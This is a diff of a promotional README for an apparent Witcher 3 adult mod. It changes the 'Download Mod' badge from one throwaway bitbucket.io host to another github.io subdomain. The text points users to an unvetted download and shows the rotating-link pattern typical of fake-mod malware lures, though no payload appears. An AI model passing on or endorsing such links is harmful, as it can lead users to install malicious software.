@@ -2,7 +2,7 @@
 
 Already slaying monsters and chasing contracts across the Continent? Time to turn up the *pleasure* side of the path. The **Witcher 3 Adult Mod** unlocks everything CD Projekt RED left just off-screen – from **fully uncensored romance scenes** to **realistic nude textures**, **custom NSFW outfits**, and **enhanced adult animations**. Whether you’re romancing Triss, Yennefer, Keira, or just wilding out in Novigrad — this mod brings mature, immersive content front and center. 🍷💋
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload12.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://Witcher-3-Adult-Mod-xicu.github.io/.github)
 ---
 
 ## 🔥 What Is the Witcher 3 Adult Mod?
